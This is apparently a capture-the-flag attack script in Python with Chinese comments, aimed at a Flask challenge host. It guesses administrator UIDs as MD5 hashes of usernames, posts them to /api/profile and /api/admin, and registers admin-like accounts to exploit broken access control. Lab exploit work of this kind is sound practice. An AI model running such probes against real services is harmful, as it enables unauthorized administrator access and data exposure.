import requests
import re
import hashlib

BASE_URL = "http://8080-f38af472-f3ae-405c-9d07-9ac048a61efd.challenge.ctfplus.cn"
session = requests.Session()

print("[*] Flask 备份接口漏洞 - 寻找管理员")
print(f"[*] Target: {BASE_URL}")
print()

# 测试1: 尝试用 admin 的 MD5 直接访问
print("[*] 测试1: 用 admin 的 MD5 直接访问 /api/admin")

admin_uid = hashlib.md5("admin".encode()).hexdigest()
print(f"    MD5('admin') = {admin_uid}")

# 尝试直接 POST /api/profile
profile_resp = session.post(f"{BASE_URL}/api/profile", 
    json={"uid": admin_uid},
    headers={"Content-Type": "application/json"})
print(f"    POST /api/profile: {profile_resp.status_code}")
print(f"    Response: {profile_resp.text}")

if '"role":"admin"' in profile_resp.text or '"admin"' in profile_resp.text:
    print(f"    [!!!] 找到管理员!")
    
    # 访问 /api/admin
    admin_resp = session.post(f"{BASE_URL}/api/admin", 
        json={"uid": admin_uid},
        headers={"Content-Type": "application/json"})
    print(f"    POST /api/admin: {admin_resp.status_code}")
    print(f"    Response: {admin_resp.text}")

print()

# 测试2: 尝试其他用户名的 MD5
print("[*] 测试2: 尝试其他用户名的 MD5")

other_usernames = [
    "administrator",
    "root",
    "superuser",
]

for username in other_usernames:
    uid = hashlib.md5(username.encode()).hexdigest()
    print(f"    [-] {username} -> {uid}")
    
    profile_resp = session.post(f"{BASE_URL}/api/profile", 
        json={"uid": uid},
        headers={"Content-Type": "application/json"})
    print(f"        POST /api/profile: {profile_resp.status_code}")
    print(f"        Response: {profile_resp.text}")
    
    if '"role":"admin"' in profile_resp.text or '"admin"' in profile_resp.text:
        print(f"        [!!!] 找到管理员!")
        
        # 访问 /api/admin
        admin_resp = session.post(f"{BASE_URL}/api/admin", 
            json={"uid": uid},
            headers={"Content-Type": "application/json"})
        print(f"        POST /api/admin: {admin_resp.status_code}")
        print(f"        Response: {admin_resp.text}")
        break

print()

# 测试3: 尝试访问 /api/admin 的其他方法
print("[*] 测试3: /api/admin 的其他方法")

# 登录
uid = "3553c1effa0b4698895a4874cfbd86d8"
session.post(f"{BASE_URL}/login", data={"uid": uid})

# 尝试 GET /api/admin
admin_resp = session.get(f"{BASE_URL}/api/admin")
print(f"    GET /api/admin: {admin_resp.status_code}")
print(f"    Response: {admin_resp.text}")

print()

# 测试4: 尝试注册特殊用户
print("[*] 测试4: 尝试注册特殊用户")

special_users = [
    "admin123",
    "user_admin",
    "admin_user",
    "123admin",
]

for username in special_users:
    print(f"    [-] 尝试注册: {username}")
    resp = session.post(f"{BASE_URL}/register", data={"username": username})
    print(f"        Status: {resp.status_code}")
    
    if resp.status_code == 200:
        print(f"        [+] 注册成功!")
        uid_match = re.search(r'[a-f0-9]{32}', resp.text)
        if uid_match:
            uid = uid_match.group()
            print(f"        UID: {uid}")
            
            # 检查角色
            profile_resp = session.post(f"{BASE_URL}/api/profile", 
                json={"uid": uid},
                headers={"Content-Type": "application/json"})
            print(f"        Role: {profile_resp.text}")
            
            if '"role":"admin"' in profile_resp.text:
                print(f"        [!!!] 找到管理员!")

print()

print("[*] 测试完成")
